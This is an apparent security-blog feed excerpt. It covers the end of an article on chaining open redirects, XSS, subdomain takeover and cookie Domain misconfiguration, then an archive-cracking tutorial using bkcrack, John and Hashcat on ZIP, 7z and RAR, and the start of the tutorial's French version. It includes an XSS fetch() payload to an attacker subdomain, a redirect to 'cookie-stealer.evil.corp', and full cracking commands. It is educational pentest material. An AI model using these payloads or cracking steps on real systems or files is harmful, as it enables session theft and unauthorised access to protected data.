<p>For that, several choices are possible:</p>
<ul>
<li>An <strong>arbitrary URL redirection</strong> (<em>Open Redirect</em>)</li>
<li>A <strong>Stored XSS</strong> or a <strong>Reflected XSS</strong>.</li>
</ul>
<p>In short, an arbitrary URL redirect is a page of the web application that will redirect the user to another page passed in parameter. Using my fictitious business example, this would result in a vulnerable blog page that has an <code>url</code> parameter that redirects the user to the compromised subdomain <code>support.axays.com</code>.</p>
<pre><code class="language-plaintext">http://blog.axays.fr/page-vulnerable?url=http://support.axays.fr</code></pre>
<p>Sometimes these kinds of parameters include a protection mechanism where you can only pass a path relative to the site itself as a parameter, for example :</p>
<pre><code class="language-plaintext">http://app.axays.fr/login?redirectUrl=/home</code></pre>
<p>In this case, it will be difficult to exploit the redirection. However, there are also applications that accept full URLs and check whether the domain of the URL belongs to the company or not. If this check is not done properly, i.e. using a standard URL <em>parser</em> and comparing the extracted <em>host</em> field to a whitelist of authorized domains, then security bypass will be possible. Indeed, I already had the occasion during penetration test to notice that the application is satisfied to get the <em>string</em> <code>url</code> or to use a <em>parser</em> of URL and to extract the host field, but to badly carried out the comparison by looking only if the <em>string</em> or the <em>host</em> field extracted finishes by <code>axays.fr</code> instead of checking that that corresponds exactly. It is easy to understand why. A company that has 500 subdomains, some of which are deleted or created every day, doesn&#8217;t want to keep a list of subdomains up to date at first. It will therefore tend to authorize <code>.*axays.fr</code> in order to accept all subdomains. Normally this trade-off is acceptable, as an attacker will not be able to send URLs to a third party web site, e.g. :</p>
<pre><code class="language-plaintext">http://blog.axays.fr/page-vulnerable?url=http://cookie-stealer.evil.corp</code></pre>
<p>But as here the attacker controls the subdomain <code>support.axays.co.uk</code>, he can easily bypass this protection mechanism.</p>
<p>Finally, the cyber-criminal may start using social engineering techniques to spread the malicious URL <code>http://blog.axays.fr/page-vulnerable?url=http://support.axays.fr</code>: phishing campaign, posting the URL on chats or forums, etc.</p>
<p>The more perceptive among you will say to yourselves:</p>
<blockquote>
<p>&quot;What&#8217;s the point of using a URL redirect and not providing the URL to the compromised subdomain directly since it looks legitimate?&quot;</p>
</blockquote>
<p>This is a good point. This is useful in case the application vulnerable to URL redirection is an application that users use every day and therefore trust, whereas the compromised subdomain, they may have never seen, it won&#8217;t speak to them and it will look suspicious. Imagine you receive a URL like: <code>http://test-app.environment-23.staging.pipe-2.dev.axays.fr</code>? It&#8217;s going to look weird right away and maybe you won&#8217;t even see the domain because the subdomain is so long.</p>
<p>A URL redirection can be rare and not affect all applications, the application must already have a parameter that manipulates a URL or a path that can be hijacked. Whereas an XSS will be a bit more generic and has a better chance of affecting a wide range of applications.</p>
<p>If the attacker finds a thoughtful XSS, he can use a similar payload:</p>
<pre><code class="language-js">&lt;script&gt;
  fetch(&#039;https://support.axays.fr&#039;, {
  method: &#039;POST&#039;,
  mode: &#039;no-cors&#039;,
  body: &#039;noraj&#039;
  });
&lt;/script&gt;</code></pre>
<p>Three comments on this:</p>
<ol>
<li>Here the client browser will make a request to the compromised subdomain in the background, it will not be redirected, so it will be more discreet. This gives an advantage to the XSS method rather than URL redirection.</li>
<li>We can take advantage of this to make a POST request and pass a whole bunch of information about the user (IP, username, browser fingerprint, etc.) in order to better identify the victim, which we will need to target the interesting sessions. This information cannot be retrieved with URL redirection, because there is no code execution and using the GET method limits the size of the URL.</li>
<li>&quot;But if we have an XSS why don&#8217;t we steal the cookies with document.cookie directly?&quot;, usually the application will have set the <code>httpOnly</code> attribute on the session cookie which prevents JavaScript from retrieving the cookies.</li>
</ol>
<p>URL redirection and reflected XSS share a common handicap, the need for user interaction: for the user to click on a malicious URL. The best way for the attacker would be to dispense with this, by using a stored XSS that will use the same mechanism as reflected XSS, but the request to the compromised subdomain will be performed automatically when the user accesses the XSS vulnerable page.</p>
<h2>Attack scenario</h2>
<p>If I summarize the complete path of the attack using 3 vulnerabilities among those studied above it gives the following steps:</p>
<ul>
<li>Use of the <code>Domain</code> attribute on the session cookie set implicitly and by default because of the use of the <code>session.cookie_domain</code> option in the PHP configuration;</li>
<li>Taking control of a fallow subdomain whose DNS entry always points to an unused cloud resource;</li>
<li>Forcing the user to visit the compromised subdomain:
<ul>
<li>Option #1: URL redirection or reflected XSS combined with a social engineering technique</li>
<li>Option #2: Stored XSS</li>
</ul>
</li>
</ul>
<p>And if I summarize the summary, it reads:</p>
<p><code>Domain</code> cookie flag + subdomain takeover + ((open-redirect / reflected XSS + social engineering) or (stored XSS))</p>
<p>What if I replace some of the words with emoji &#x1f92f; in order to arrive at a cyber-rebus :</p>
<p><code>Domain</code> &#x1f36a; &#x1f6a9; &#x2795; subdomain &#x1f977; &#x2795; ((&#x1f450;-&#x23e9; / &#x1fa9e; &#x1f1fd; &#x1f1f8; &#x1f1f8; &#x2795; &#x1f973; &#x2699;&#xfe0f;) or (&#x1f4e6; &#x1f1fd; &#x1f1f8; &#x1f1f8;))</p>
<h2>Blind spot and morality</h2>
<p>Some companies that receive penetration testing may tend to fix vulnerabilities that are <em>High</em> or <em>Critical</em> in severity quickly or in a reasonable amount of time, but take a very long time (e.g., more than a year) to fix vulnerabilities that are <em>Medium</em> or <em>Low</em> in severity, or never fix them at all, because a decision-maker may judge, certainly incorrectly, that the risk is acceptable.</p>
<p>It is true that individually taken, one might be tempted to think the following assertions about these vulnerabilities:</p>
<ul>
<li>&quot;It&#8217;s just a configuration error&quot;</li>
<li>&quot;The subdomains belong to us, an attacker won&#8217;t be able to do anything&quot;</li>
<li>&quot;An attacker would already have to control one of our subdomains, but we have WAFs on every application&quot;</li>
<li>&quot;Cookies are protected against XSS anyway&quot;</li>
<li>&quot;The attacker won&#8217;t be able to do anything with a URL redirection, we have set up a filtering on our domains&quot;</li>
<li>&quot;The SOC will detect connections to third party domains&quot;</li>
<li>etc.</li>
</ul>
<p>There is no need to go through these excuses one by one, if you have read this article diligently, you are usually already convinced that each of them can be circumvented.</p>
<p>As we have seen throughout this article, when combined, all of these &quot;low risk&quot; vulnerabilities constitute a serious risk with a real and significant impact.</p>
<p>In general, many so-called weak vulnerabilities do not have a direct impact on the target individually, but can become formidable when cleverly chained together. This is why, despite the fact that there is no urgency to correct them, they should still be taken seriously and eventually fixed.</p>
<p>We have just seen that because the impact of these vulnerabilities seems unclear, unlikely or anecdotal, some people may choose to neglect fixing them after a penetration test. But this can be worse in the context of a bug bounty program.</p>
<p>Indeed, many bug bounty platforms exclude the weakest vulnerabilities in order to prevent their customers from being overwhelmed by waves of reports without impact with unexploitable vulnerabilities. There is often overzealousness about the completeness of the types of vulnerabilities to be added to the <em>out of scope</em> list. Here&#8217;s what we can see in typical exclusion lists:</p>
<ul>
<li>Reflected XSS: excluded if no impact demonstrated. By the way, reflected XSS are excluded from eligible exploit scripts on <a href="https://www.exploit-db.com/submit">Exploit-DB</a> if they do not have an assigned CVE number.</li>
<li>Arbitrary URL redirection: it is not uncommon to see this type of bug excluded unconditionally.</li>
<li>Configuration error: excluded if no impact is demonstrated and a proof of concept is not provided.</li>
<li>Subdomain takeover: excluded if no impact is demonstrated and a proof of concept is not provided.</li>
<li>Misconfigured cookie attributes: almost always excluded. This is especially true of the <code>HttpOnly</code> and <code>Secure</code> attributes, since they only matter for session cookies and not for cookies containing functional information such as preferred language. Many newbies don&#8217;t fully understand the function or impact and tend to report their absence incorrectly, causing clients and platforms to exclude them from eligible bug types. The <code>Domain</code> and <code>HostOnly</code> attributes are thus excluded as collateral damage.</li>
<li>Violations of good (security) practices: almost always excluded. Same reason as above.</li>
</ul>
<p>The ever-growing exclusion lists within bug bounty programs discourage bug hunters from reporting such security issues, even though in some cases they can have a significant impact. Experienced researchers are then forced to combine many of these vulnerabilities in order to be able to prove the criticality of a scenario using these out-of-scope vulnerabilities.</p>
<p>It is one thing to play with fire by accepting a risk rather than correcting a vulnerability, but it is another to be unaware that the vulnerability exists because it has not been addressed due to marginalization.</p>
<p>The moral? When in doubt, it is better to fix.</p>
<h2>About the author</h2>
<p>Article written by Alexandre ZANNI aka <a href="https://pwn.by/noraj/">noraj</a>, Penetration Testing Engineer at <a href="https://www.acceis.fr/">ACCEIS</a>.</p>
<p>The post <a rel="nofollow" href="https://www.acceis.fr/transform-p3-p4-p5-vulnerabilities-to-p1/">Transform P3 P4 P5 vulnerabilities to P1</a> appeared first on <a rel="nofollow" href="https://www.acceis.fr">ACCEIS</a>.</p>
]]></content:encoded>
					
		
		
			</item>
		<item>
		<title>Cracking encrypted archives (PKZIP: Zip ZipCrypto, Winzip: Zip AES, 7 Zip, RAR)</title>
		<link>https://www.acceis.fr/cracking-encrypted-archives-pkzip-zip-zipcrypto-winzip-zip-aes-7-zip-rar/</link>
		
		<dc:creator><![CDATA[Alexandre Zanni]]></dc:creator>
		<pubDate>Tue, 19 Jul 2022 09:09:11 +0000</pubDate>
				<category><![CDATA[Blog]]></category>
		<category><![CDATA[Outils et méthodes]]></category>
		<category><![CDATA[crack]]></category>
		<category><![CDATA[zip]]></category>
		<guid isPermaLink="false">https://www.acceis.fr/?p=2523</guid>

					<description><![CDATA[<p>In this article we&#8217;ll see how to crack encrypted archive protected with a password: Using Biham and Kocher plaintext attack on Zip archives (PKZIP) using encryption method ZipCrypto Store (can be extended to ZipCrypto Deflate) Using classic wordlist attack on other encrypted archives: Zip archives (WinZip) using encryption method AES (128,192,256), 7-Zip and RAR. While [&#8230;]</p>
<p>The post <a rel="nofollow" href="https://www.acceis.fr/cracking-encrypted-archives-pkzip-zip-zipcrypto-winzip-zip-aes-7-zip-rar/">Cracking encrypted archives (PKZIP: Zip ZipCrypto, Winzip: Zip AES, 7 Zip, RAR)</a> appeared first on <a rel="nofollow" href="https://www.acceis.fr">ACCEIS</a>.</p>
]]></description>
										<content:encoded><![CDATA[<p>In this article we&#8217;ll see how to crack encrypted archive protected with a password:</p>
<ul>
<li>Using <a href="https://link.springer.com/content/pdf/10.1007/3-540-60590-8_12.pdf">Biham and Kocher plaintext attack</a> on Zip archives (PKZIP) using encryption method ZipCrypto Store (can be extended to ZipCrypto Deflate)</li>
<li>Using classic wordlist attack on other encrypted archives: Zip archives (WinZip) using encryption method AES (128,192,256), 7-Zip and RAR.</li>
</ul>
<p>While most of the software use only AES encrypted ZIPs (or use AES encryption by default), some software still generate ZipCrypto encrypted archives by default. This is because the Microsoft Windows operating system does not allow to generate (without installing a third party software) encrypted Zip files and can only decrypt Zip archives using ZipCrypto, which makes this old and depreciated encryption method still used today.</p>
<p>Note: This article is also available <a href="https://www.acceis.fr/craquage-darchiv…ip-aes-7-zip-rar/" title="article: french version">in french</a> &#x1f1eb;&#x1f1f7;.</p>
<h2>Zip</h2>
<h3>ZipCrypto</h3>
<p>Older encrypted ZIP archives can suffer from <em>Biham and Kocher plaintext attack</em> if they use the <strong>ZipCrypto Store</strong> encryption method. It is also possible if the archive use <strong>ZipCrypto Deflate</strong> but it is harder since files are compressed before encryption.</p>
<p>To check which encryption algorithm is used you can use 7z:</p>
<pre><code class="language-plaintext">$ 7z l -slt archive.zip | grep Method
Method = ZipCrypto Store

$ 7z l -slt archive.zip | grep Method
Method = ZipCrypto Deflate

$ 7z l -slt archive.zip | grep Method
Method = AES-256 Deflate</code></pre>
<p>Note: to generate a ZIP archive using ZipCrypto Store we can use the old <a href="http://infozip.sourceforge.net/Zip.html">zip</a> utility: <code>zip -e -0 archive.zip logo_acceis.svg</code> or <a href="https://www.7-zip.org/">7z</a>: <code>7z a -tzip -mx0 -p -mem=ZipCrypto archive.zip logo_acceis.svg</code>.</p>
<p>To conduct this attack, it requires at least 12 bytes of known plaintext and at least 8 of them must be contiguous. The larger the contiguous known plaintext, the faster the attack.</p>
<p>What&#8217;s nice is that the Zip format can&#8217;t protect the filenames so even is the archive is encrypted we can still list filenames, retrieve the extension to understand what kind of document is stored and target fixed <a href="https://en.wikipedia.org/wiki/List_of_file_signatures">file signature</a> (aka magic bytes) if you don&#8217;t know any content from the encrypted files.</p>
<pre><code class="language-plaintext">$ 7z l archive.zip

7-Zip [64] 17.04 : Copyright (c) 1999-2021 Igor Pavlov : 2017-08-28
,Utf16=on,HugeFiles=on,64 bits,8 CPUs x64)

Scanning the drive for archives:
1 file, 1694 bytes (2 KiB)

Listing archive: archive.zip

--
Path = archive.zip
Type = zip
Physical Size = 1694

   Date      Time    Attr         Size   Compressed  Name
------------------- ----- ------------ ------------  ------------------------
2022-04-29 11:09:49 .....         3623         1498  logo_acceis.svg
------------------- ----- ------------ ------------  ------------------------
2022-04-29 11:09:49               3623         1498  1 files</code></pre>
<p>In this archive we can see there is a SVG image, we know that any SVG image will begin with <code>&lt;?xml version=&quot;1.0&quot;?&gt;</code> or <code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</code> and maybe will be followed by <code>&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; ...</code>, but let&#8217;s keep only what is 100% sure: <code>&lt;?xml version=&quot;1.0&quot;</code> (19 bytes long), which should be plenty enough for our attack.</p>
<p>We can obtain a free additional byte from CRC, as explained in the <a href="https://pkware.cachefly.net/webdocs/casestudies/APPNOTE.TXT">ZIP file format specification</a>, a 12-byte encryption header in prepended to the data in the archive. The last byte of the encryption header is the most significant byte of the file&#8217;s CRC.</p>
<blockquote>
<p>6.1.3 Each encrypted file has an extra 12 bytes stored at the start<br />
of the data area defining the encryption header for that file.  The<br />
encryption header is originally set to random values, and then<br />
itself encrypted, using three, 32-bit keys.  The key values are<br />
initialized using the supplied encryption password.  After each byte<br />
is encrypted, the keys are then updated using pseudo-random number<br />
generation techniques in combination with the same CRC-32 algorithm<br />
used in PKZIP and described elsewhere in this document.</p>
<p>After the header is decrypted,  the last 1 or 2 bytes in Buffer<br />
SHOULD be the high-order word/byte of the CRC for the file being<br />
decrypted, stored in Intel low-byte/high-byte order.  Versions of<br />
PKZIP prior to 2.0 used a 2 byte CRC check; a 1 byte CRC check is<br />
used on versions after 2.0.  This can be used to test if the password<br />
supplied is correct or not.</p>
</blockquote>
<p>We can get the CRC of the file using various tools:</p>
<pre><code class="language-plaintext">$ 7z l -slt archive.zip  logo_acceis.svg | grep CRC
CRC = 1916B617
$ unzip -Z -v archive.zip logo_acceis.svg | grep CRC
  32-bit CRC value (hex):                         1916b617</code></pre>
<p>So the byte just before the plaintext (at offset -1) is 0x19.</p>
<p>Then we can start the attack using <a href="https://github.com/kimci86/bkcrack">bkcrack</a>:</p>
<pre><code class="language-plaintext">$ printf &#039;&lt;?xml version=&quot;1.0&quot;&#039; &gt; plain.svg
$ bkcrack -C archive.zip -c logo_acceis.svg -p plain.svg -x -1 19</code></pre>
<ul>
<li><code>-C</code>: Zip archive containing cipherfile</li>
<li><code>-c</code>: File containing the ciphertext (the one we target in the archive)</li>
<li><code>-p</code>: File containing the known plaintext</li>
<li><code>-x</code>: Additional plaintext in hexadecimal starting at the given offset</li>
</ul>
<p>It takes a long time (~24 min for this example) but we are able to recover the encryption keys.<br />
A wordlist attack would be more efficient for weak passwords but this method can help recover files protected with very complex passwords.</p>
<pre><code class="language-plaintext">$ bkcrack -C archive.zip -c &#039;logo_acceis.svg&#039; -p plain.bin -x -1 19
bkcrack 1.3.5 - 2022-03-20
[15:07:25] Z reduction using 12 bytes of known plaintext
100.0 % (12 / 12)
[15:07:25] Attack on 573157 Z values at index 6
Keys: 18996980 070e64a5 38e61fb0
86.6 % (496251 / 573157)
[15:31:27] Keys
18996980 070e64a5 38e61fb0</code></pre>
<p>Then to recover the original files we have several options.</p>
<p>We can create a copy archive with a chosen password.</p>
<pre><code class="language-plaintext">$ bkcrack -C archive.zip -k 18996980 070e64a5 38e61fb0 -U cracked.zip noraj
bkcrack 1.3.5 - 2022-03-20
[15:57:19] Writing unlocked archive cracked.zip with password &quot;noraj&quot;
100.0 % (1 / 1)
Wrote unlocked archive.</code></pre>
<p>Else we can also try to crack the keys to find the original password.</p>
<p><code>bkcrack</code> can perform bruteforce on the keys but the options are limited and it doesn&#8217;t support wordlist attacks.</p>
<pre><code class="language-plaintext">$ bkcrack -k 18996980 070e64a5 38e61fb0 -r 8 \?a
bkcrack 1.3.5 - 2022-03-20
[16:16:01] Recovering password
length 0-6...
length 7...
length 8...
[16:16:01] Password
as bytes: 6d 6f 72 70 68 65 75 73
as text: morpheus</code></pre>
<p>Concatenating the three keys gives us the PKZIP Master Key that we can try to crack with Hashcat.</p>
<pre><code class="language-plaintext">$ haiti &#039;18996980070e64a538e61fb0&#039;
CRC-96 (ZIP)
PKZIP Master Key [HC: 20500]
PKZIP Master Key (6 byte optimization) [HC: 20510]
Crypt16

$ hashcat -m 20500 hash-hc.txt /usr/share/wordlists/passwords/rockyou.txt</code></pre>
<h3>AES</h3>
<p>First we need to extract a crackable hash from the Zip archive. To do so we can use the <code>zip2john</code> script shipped in <code>john</code> package.</p>
<pre><code class="language-plaintext">$ zip2john archive.zip
archive.zip/logo_acceis.svg:$zip2$*0*3*0*d56b93462995433968b5f3f76eccbaea*5d55*5aa*27b48e12e3164b4dedd49a676c53392544c2c73eb472aab93ab61ce8968c8bfe7780b5de771f5ec32172c99687cf38ec469c35ffb71b2b1b6d2679fcf173970b59e1b9207adf8c9190e394c3346ced7372e149dc91b84ca8b19321cadffa9f5b75514a2f58e9e840778aa70900507ec8dda645bb8c8e066edf98f8f87feb7a2d10aa084fdb39c696f3c92592ba81c543cc11e2dd969de477321abd7639435495e4f1b26f6badb31bd88792b96757936b47b26ed267685bd9240ee11777c42a10e6a5829e64b2dd1a4ae77d8bf80854450385f6e4fd98ac07ed8e0ed852a682133d81ef903b43d534e6f785172b9f078dad64351efdad6e0348983c0407fef4d87c0090989f158bdfbe97e30710869370c70d95aef04ce815cacf8405baa921e0441dd8d69d7e17aed4b8adbc9651732fc1d5d7a2c7ec99af45e25a4047805ee6a88649eda6e170a682c19b20c5bbfe4f5720f425d4afe71d1954c87b3b910213a3f059db5eedeb696d34773482e43f8067248054b520642648b002534acb732dd0bbec6fa4eeee508b25688b0fa70c64a09bb50dc9ead6aa8410f432b982c529b67161db42c00aeba567682856d610c8768c695b562522dd57456062e947b5fc0f4316b7a2a818274e166508e0211125bafc37cbe590de9b44925149a421d3b8c15b05aa82acbc41a6c20c933d6f0ad605506db122d588e1656c540c1c69d58c5f7532933f479f5db305c7d2575275a666c8ee3b7a37ec7f0fcf53fcbe0176df72e188667de4c503956dea8fcc6ec88c868fc3505c4aea03a46e4c395a673ad7981f943dd9457a847eac7fe6758fe98336ef33ce613ddaede21848be50b062984f42d53abb84b7bad59c8d8e39ab55415700a3a416249d8d35098e59a7152ce304e91c541a46418b986b31580820cd19796a739c485c2445b21c5736e1239198a9faf05fe642e26385f90dc082a74fe560fb269bf90529af46b6986cf1ada22e95cf3dc276dd46fdbd501da78991f251556773543e8e6519c4ed4db2d954dd7e9b82e7694f17be9c75a3d5813347f0f5f7bdc8086a06bbc7510bc30b81e9fb31aec599ce018558e06214b42063386ddde083efe25889f262d25640cba5c2c3088d3cfd08263a89922ab6cf7fb3e5887acb20c851e130391a0034029a4400f4b9118f1fa740868da097b7c4529c55dc02c568c6dee5304ffd461e945c2be22d6d2fe5efe94937834035851d584bf7da08d9db49916bb055fb12983e1bce1be997f9e9b3e2f0650eccb250592f3720ba8ed1ee210b795c022b01326047d5fe23ee10058b43950fdd7520dda0cf3ec5c026d767c5cb40599a24da7c49fb4609b69900ad922680e1f3da25afd0d8581c6ff0dad8897a72f4e9a0540b1ba7d8a4d316714adb0543ef3377feeab47e2b6739db092cbe254afb9f9fbe485b971aca0a4fea5f669bf6f71492508e6bc1ace46aec90533e4fdf3c93fc6a1e0897cfcc965f7457d53045ec2a2d5da2b04249894cf920c91f20a03128adbf7d2a4072b287481d4c7714ad8785fae5713666d1308ea90f07d99951a36f687be95d35f7ec1322f7b92e3a0d6615485461cad911472faae76a6b548fa5226c1cca1187245c3ca7978fb19ccb5911d34a158888d3b6a758def7546a21cc0f4120687edc25f798a0583b768f99d5021d35bfefc4f22e0e909e720dc02f9a2350dc8f41c2e092726dcca4cdc45eb0e0d969312d4ee7a79b6856fb8792868ed3e4b97aecb62c61779658b9b55c5fe4606c086bdf88d88dc24a5ff822ae035093a104839acf0566367e13d4b658249db0d947f37e26dbe67d6fe92313d4c5546576000891e3e46c749848d5dd3cb9110709f75f35fd826650a2787a300303583cbeb06f88fe0209482b403fd8fe0cbc88159d420acb0c2f680e96a43087c170a9f07b93748b36359f5a522d0f2354f4d540e0fc45e9f7de99aced9d9ee0ba64dc9b61bc4d9111f439c6d9d79f50b1e3143e259a5a09094dd4a8d946b24564919e5350ed83562df37e2419620c29b0d72f7639d6*d4a4e58a92cbb2a72f38*$/zip2$:logo_acceis.svg:archive.zip:archive.zip
$ rar2john archive.rar &gt; hash.txt</code></pre>
<p>We can use <a href="https://github.com/noraj/haiti">haiti</a> to determine the hash type (we already know) and the corresponding reference for Hashcat (HC) and John the Ripper (JtR):</p>
<pre><code class="language-plaintext">$ haiti $(cut -d &#039;:&#039; -f 2 hash.txt)
WinZip [HC: 13600] [JtR: zip]</code></pre>
<p>Now we can try a wordlist bruteforce attack on the hash with JtR.</p>
<pre><code class="language-bash"># ~56k tries per second on my machine (Intel i5-1145G7 @ 2.6 GHz), instant crack for the password morpheus
john hash.txt -w=/usr/share/wordlists/passwords/rockyou.txt --format=zip</code></pre>
<p>If we want to try with HC we need to strip the filename from the hash:</p>
<pre><code class="language-plaintext">$ cut -d &#039;:&#039; -f 2 hash.txt &gt; hash-hc.txt</code></pre>
<p>The cracking with Hashcat has 3 times more tries per second but takes strangely more time:</p>
<pre><code class="language-bash"># ~163k tries per second on my machine (Intel TigerLake-LP GT2 [Iris Xe Graphics]), 20 secs crack for the password morpheus
hashcat -m 13600 hash-hc.txt /usr/share/wordlists/passwords/rockyou.txt</code></pre>
<p>Note: this method can also work for ZipCrypto protected archives. As discusses before wordlist or bruteforce attacks are more efficient for weak passwords but <em>Biham and Kocher plaintext attack</em> could be the only option for complex passwords.</p>
<h2>7-zip</h2>
<p>First we need to extract a crackable hash from the 7z archive. To do so we can use the <code>7z2john</code> script shipped in <code>john</code> package but it requires <code>Compress::Raw::Lzma</code> Perl module to work. We can install it with <a href="https://www.cpan.org/">CPAN</a>: <code>cpan install Compress::Raw::Lzma</code>.</p>
<p>Now we can obtain the hash:</p>
<pre><code class="language-plaintext">$ 7z2john archive.7z
archive.7z:$7z$0$19$0$$16$fece1a2adfc036675b63b8d17fd3f23f$1908987488$128$122$525a8b050266d616bc88c39ef6184bfe642ed3b2efa7a97c1661fe46ffab4fada7501a39702397a38fae8b61289a22a3cdefd85812e637da96e723ded8b41f6def71aab1c5722413eaafba07fc6945cfe495650ef9f36ef5cb98f6f060994359717a3e4e5e3c1ee31139c0ab51140a79804064ad7fa870c5a1d0b97d98ce6934
$ 7z2john archive.7z &gt; hash.txt</code></pre>
<p>Note: the test 7z archive was generated with LZMA2 compression, AES256 encryption and no multi-volume.</p>
<p>We can use <a href="https://github.com/noraj/haiti">haiti</a> to determine the has type (we already know) and the corresponding reference for Hashcat (HC) and John the Ripper (JtR):</p>
<pre><code class="language-plaintext">$ haiti $(cut -d &#039;:&#039; -f 2 hash.txt)
7-zip [HC: 11600] [JtR: 7z]</code></pre>
<p>Now we can try a wordlist bruteforce attack on the hash with JtR, it&#8217;s slow.</p>
<pre><code class="language-bash"># 43 tries per second on my machine (Intel i5-1145G7 @ 2.6 GHz), 5 mins crack for the password morpheus
john hash.txt -w=/usr/share/wordlists/passwords/rockyou.txt --format=7z</code></pre>
<p>If we want to try with HC we need to strip the filename from the hash:</p>
<pre><code class="language-plaintext">$ cut -d &#039;:&#039; -f 2 hash.txt &gt; hash-hc.txt</code></pre>
<p>The cracking with Hashcat has 3 times more tries per second but is strangely 2 times longer:</p>
<pre><code class="language-bash"># 130 tries per second on my machine (Intel TigerLake-LP GT2 [Iris Xe Graphics]), 10 mins, 44 secs crack for the password morpheus
hashcat -m 11600 hash-hc.txt /usr/share/wordlists/passwords/rockyou.txt</code></pre>
<p>Note: 7z encrypted archives also protect filenames.</p>
<h2>RAR</h2>
<p>First we need to extract a crackable hash from the RAR archive. To do so we can use the <code>rar2john</code> script shipped in <code>john</code> package.</p>
<pre><code class="language-plaintext">$ rar2john archive.rar
archive.rar:$rar5$16$0ee908df02e8f7e7697d862388d329eb$15$52eafa34fd7337161521ca986dcc9e8b$8$a887866220451ac5
$ rar2john archive.rar &gt; hash.txt</code></pre>
<p>Note: the test archive was generated in RAR 5.0 format which <a href="https://www.win-rar.com/encryption-faq.html?&amp;L=0#which-encryption-technology-uses-winrar">seems to use AES-256</a>.</p>
<p>We can use <a href="https://github.com/noraj/haiti">haiti</a> to determine the hash type (we already know) and the corresponding reference for Hashcat (HC) and John the Ripper (JtR):</p>
<pre><code class="language-plaintext">$ haiti $(cut -d &#039;:&#039; -f 2 hash.txt)
SAP CODVN B (BCODE) [HC: 7700] [JtR: sapb]
RAR5 [HC: 13000] [JtR: rar5]</code></pre>
<p>Now we can try a wordlist bruteforce attack on the hash with JtR.</p>
<pre><code class="language-bash"># ~350 tries per second on my machine (Intel i5-1145G7 @ 2.6 GHz), 35 secs crack for the password morpheus
john hash.txt -w=/usr/share/wordlists/passwords/rockyou.txt --format=rar5</code></pre>
<p>If we want to try with HC we need to strip the filename from the hash:</p>
<pre><code class="language-plaintext">$ cut -d &#039;:&#039; -f 2 hash.txt &gt; hash-hc.txt</code></pre>
<p>The cracking with Hashcat has 5 times more tries per second but takes strangely the same time:</p>
<pre><code class="language-bash"># ~2000 tries per second on my machine (Intel TigerLake-LP GT2 [Iris Xe Graphics]), 40 secs crack for the password morpheus
hashcat -m 13000 hash-hc.txt /usr/share/wordlists/passwords/rockyou.txt</code></pre>
<p>Note: the same method works for RAR3 archives, only HC and JtR references will be different.</p>
<h2>Conclusion</h2>
<p>Regardless of the archive format, it is recommended to check the encryption method used and choose the most robust one in the options of the software used to generate an encrypted archive.</p>
<p>For the ZIP format in particular, it is recommended to use AES as the encryption method. Indeed, even with a strong password, ZipCrypto is vulnerable by design, so there is a high chance that it is possible to read the documents that the archive contains without knowing the password.</p>
<p>Finally, even if a strong encryption method is used, the use of a weak password can compromise the security of the archive. It is therefore recommended to use <a href="https://www.ssi.gouv.fr/administration/precautions-elementaires/calculer-la-force-dun-mot-de-passe/">a strong password</a> to protect the archive.</p>
<p>Example of the choice of the encryption method in 7-zip:</p>
<p><img src="https://www.acceis.fr/voy_content/uploads/2022/07/7-zip.png" alt="7-zip" /></p>
<p>Example of the choice of the encryption method in Ark:</p>
<p><img src="https://www.acceis.fr/voy_content/uploads/2022/07/ark.png" alt="ark" /></p>
<p>Example of the choice of the encryption method in WinRAR (Checking the box &quot;ZIP legacy encryption&quot; will use ZipCrypto, WinRAR will use AES if not checked):</p>
<p><img src="https://www.acceis.fr/voy_content/uploads/2022/07/WinRAR.png" alt="WinRAR" /></p>
<h2>About the author</h2>
<p>Article written by Alexandre ZANNI aka <a href="https://pwn.by/noraj/">noraj</a>, Penetration Testing Engineer at <a href="https://www.acceis.fr/">ACCEIS</a>.</p>
<p>The post <a rel="nofollow" href="https://www.acceis.fr/cracking-encrypted-archives-pkzip-zip-zipcrypto-winzip-zip-aes-7-zip-rar/">Cracking encrypted archives (PKZIP: Zip ZipCrypto, Winzip: Zip AES, 7 Zip, RAR)</a> appeared first on <a rel="nofollow" href="https://www.acceis.fr">ACCEIS</a>.</p>
]]></content:encoded>
					
		
		
			</item>
		<item>
		<title>Craquage d&#8217;archives chiffrées (PKZIP: Zip ZipCrypto, Winzip: Zip AES, 7 Zip, RAR)</title>
		<link>https://www.acceis.fr/craquage-darchives-chiffrees-pkzip-zip-zipcrypto-winzip-zip-aes-7-zip-rar/</link>
		
		<dc:creator><![CDATA[Alexandre Zanni]]></dc:creator>
		<pubDate>Tue, 19 Jul 2022 09:09:06 +0000</pubDate>
				<category><![CDATA[Blog]]></category>
		<category><![CDATA[Outils et méthodes]]></category>
		<category><![CDATA[crack]]></category>
		<category><![CDATA[zip]]></category>
		<guid isPermaLink="false">https://www.acceis.fr/?p=2514</guid>

					<description><![CDATA[<p>Dans cet article, nous allons voir comment craquer une archive chiffrée protégée par un mot de passe en utilisant : L&#8217;attaque à clair connu de Biham et Kocher sur des archives Zip (PKZIP) basées sur la méthode de chiffrement ZipCrypto Store (peut être étendu à ZipCrypto Deflate). Une attaque classique par liste de mots sur [&#8230;]</p>
<p>The post <a rel="nofollow" href="https://www.acceis.fr/craquage-darchives-chiffrees-pkzip-zip-zipcrypto-winzip-zip-aes-7-zip-rar/">Craquage d&#8217;archives chiffrées (PKZIP: Zip ZipCrypto, Winzip: Zip AES, 7 Zip, RAR)</a> appeared first on <a rel="nofollow" href="https://www.acceis.fr">ACCEIS</a>.</p>
]]></description>
										<content:encoded><![CDATA[<p>Dans cet article, nous allons voir comment craquer une archive chiffrée protégée par un mot de passe en utilisant :</p>
<ul>
<li>L&#8217;attaque à clair connu de <a href="https://link.springer.com/content/pdf/10.1007/3-540-60590-8_12.pdf">Biham et Kocher</a> sur des archives Zip (PKZIP) basées sur la méthode de chiffrement ZipCrypto Store (peut être étendu à ZipCrypto Deflate).</li>
<li>Une attaque classique par liste de mots sur d&#8217;autres archives chiffrées telle que les archives Zip (WinZip) basées sur la méthode de chiffrement AES (128,192,256), 7-Zip ou encore RAR.</li>
</ul>
